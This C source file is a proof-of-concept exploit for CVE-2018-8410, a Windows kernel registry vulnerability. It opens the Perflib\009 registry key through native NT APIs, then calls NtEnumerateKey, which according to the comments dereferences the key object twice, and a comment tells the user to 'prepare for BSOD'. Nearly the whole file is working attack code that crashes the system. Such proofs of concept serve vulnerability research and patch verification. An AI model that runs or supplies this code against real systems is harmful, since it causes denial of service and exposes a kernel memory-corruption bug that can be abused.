/*CVE-2018-8410 discovered by Mauro Leggier from TRAPMINE */

#include <SDKDDKVer.h>
#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *lpfnNtOpenKey)(_Out_ PHANDLE KeyHandle, _In_ ACCESS_MASK DesiredAccess,
                                        _In_ POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSTATUS (NTAPI *lpfnNtEnumerateKey)(_In_ HANDLE KeyHandle, _In_ ULONG Index, _In_ ULONG KeyInfoClass,
                                             _Out_ PVOID KeyInformation, _In_ ULONG Length, _Out_ PULONG ResultLength);

#define _KeyBasicInformation 0

int main()
{
  static UNICODE_STRING usKey = {
    74 * 2,
    74 * 2,
    (PWSTR)L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Perflib\\009"
  };
  lpfnNtOpenKey fnNtOpenKey;
  lpfnNtEnumerateKey fnNtEnumerateKey;
  HINSTANCE hNtDll;
  OBJECT_ATTRIBUTES sObjAttr;
  NTSTATUS ntstatus;
  HANDLE hKey;
  BYTE buf[2048];
  ULONG RetLength;

  //get ntapi
  hNtDll = ::GetModuleHandleW(L"ntdll.dll");
  fnNtOpenKey = (lpfnNtOpenKey)::GetProcAddress(hNtDll, "NtOpenKey");
  fnNtEnumerateKey = (lpfnNtEnumerateKey)::GetProcAddress(hNtDll, "NtEnumerateKey");

  //open a predefined key
  memset(&sObjAttr, 0, sizeof(sObjAttr));
  sObjAttr.Length = (ULONG)sizeof(sObjAttr);
  sObjAttr.Attributes = OBJ_CASE_INSENSITIVE;
  sObjAttr.ObjectName = &usKey;
  ntstatus = fnNtOpenKey(&hKey, KEY_READ, &sObjAttr);
  if (NT_SUCCESS(ntstatus))
  {
    //make a call to some registry api
    //it will ref the object BUT deref TWICE!!!
    ntstatus = fnNtEnumerateKey(hKey, 0, _KeyBasicInformation, buf, 2048, &RetLength);

    //prepare for BSOD!

    ::RegCloseKey((HKEY)hKey);
  }
  return 0;
}
